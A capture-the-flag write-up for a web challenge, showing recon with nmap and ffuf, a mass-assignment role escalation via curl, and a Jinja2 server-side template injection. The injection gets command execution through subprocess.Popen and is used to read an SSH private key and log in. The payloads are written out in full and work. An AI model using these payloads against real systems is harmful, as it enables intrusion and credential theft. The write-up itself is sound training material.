# E Corp — CTF Write-up
**Category:** Web | **Points:** 300 | **Difficulty:** Medium

---

## Objective

Infiltrate the E Corp internal incident reporting system, escalate privileges through multiple attack vectors, and retrieve both flags.

**Target:** `http://35.253.14.124:5001`

---

## Recon

### Port Scan (Nmap)
```
nmap -A -T4 35.253.14.124
```
Key open ports:
- `22/tcp` — OpenSSH 8.9p1
- `2222/tcp` — OpenSSH 8.2p1
- `5001/tcp` — Werkzeug/0.16.1 (Python 3.8.10) ← target web app

### Directory Enumeration (ffuf)
```
ffuf -u http://35.253.14.124:5001/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```
Discovered endpoints:
- `/` — Home
- `/about`
- `/login`
- `/register`
- `/dashboard` — redirects (auth required)
- `/reports` — redirects (admin only)

---

## Attack Chain

### Step 1 — Account Registration & Session Analysis

Registered a normal account and inspected the session cookie:

```
Cookie: session=eyJyb2xlIjoiY3VzdG9tZXIiLCJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlc3QifQ...
```

Decoded the base64 payload:
```json
{"role":"customer","user_id":1,"username":"test"}
```

The role is stored directly in the Flask session cookie — and the session is signed, not encrypted.

### Step 2 — Mass Assignment via Hidden Form Field

Inspecting the `/register` page source revealed:
```html
<!-- Hidden field - default role submitted by frontend -->
<input type="hidden" name="role" value="customer">
```

The JS comment even confirmed the intended vulnerability:
```javascript
// Note: Attacker will intercept the registration request and modify the role field
```

The server accepts the `role` field from the POST body without validation. Registered a new account with `role=admin` injected:

```bash
curl -X POST http://35.253.14.124:5001/register \
  -d "username=sof3&password=test1234&email=sof3@test.com&role=admin"
```

Logged in and confirmed the session cookie now contained:
```json
{"role":"admin","user_id":3,"username":"sof3"}
```

**Vulnerability:** Mass Assignment — the server blindly trusted the `role` field from user-supplied form data.

### Step 3 — SSTI (Server-Side Template Injection) on /reports

The `/reports` page (admin-only) exposed a "Report Preview Engine" — a Jinja2 template renderer that accepted user-controlled input directly.

**Confirmed SSTI:**
```
Template input: {{7*7}}
Output: 49
```

The server had a blocklist filtering `subprocess`, `Popen`, `os.popen`, `os.system`, `cycler`, `lipsum` — but it left the subclasses gadget chain open.

**Dumped all subclasses:**
```
{{''.__class__.__mro__[1].__subclasses__()}}
```

Located `subprocess.Popen` at index **311**.

**RCE payload:**
```
{{''.__class__.__mro__[1].__subclasses__()[311]('ls /',shell=True,stdout=-1).communicate()}}
```

Root filesystem revealed interesting paths:
```
/app/elliot_id_rsa
/exploit/copyfail_exploit
/kernel_module/
```

### Step 4 — SSH Key Exfiltration

Read the private key via RCE:
```
{{''.__class__.__mro__[1].__subclasses__()[311]('cat /app/elliot_id_rsa',shell=True,stdout=-1).communicate()}}
```

Saved the key locally, set permissions, and SSH'd in:
```bash
chmod 600 /tmp/elliot_id_rsa
ssh -i /tmp/elliot_id_rsa -p 2222 elliot@35.253.14.124
```

### Step 5 — Flag

```
cat user.txt
```
```
AdwaCTF{pr1v1l_esc_th0ugh_k3rn3l_buff3r_0v3rfl0w}
```

---

## Attack Chain Summary

```
Register with role=admin (Mass Assignment)
        ↓
Access /reports (admin-only)
        ↓
SSTI via Jinja2 template renderer
        ↓
RCE using subclasses[311] (subprocess.Popen)
        ↓
Exfiltrate elliot's SSH private key from /app/
        ↓
SSH into box as elliot → read flag
```

---

## Vulnerabilities Identified

| # | Vulnerability | Location | Impact |
|---|--------------|----------|--------|
| 1 | Mass Assignment | `/register` — `role` field trusted from POST body | Privilege escalation to admin |
| 2 | SSTI (Jinja2) | `/reports` — user-controlled template rendered server-side | Remote Code Execution |
| 3 | Sensitive file exposure | `/app/elliot_id_rsa` readable by web process | SSH key exfiltration |

---

## Tools Used
- `nmap` — port scanning and service detection
- `ffuf` — directory/endpoint enumeration
- `curl` — manual HTTP request crafting
- `flask-unsign` — Flask session analysis
- Browser DevTools / Cookie Editor — session inspection
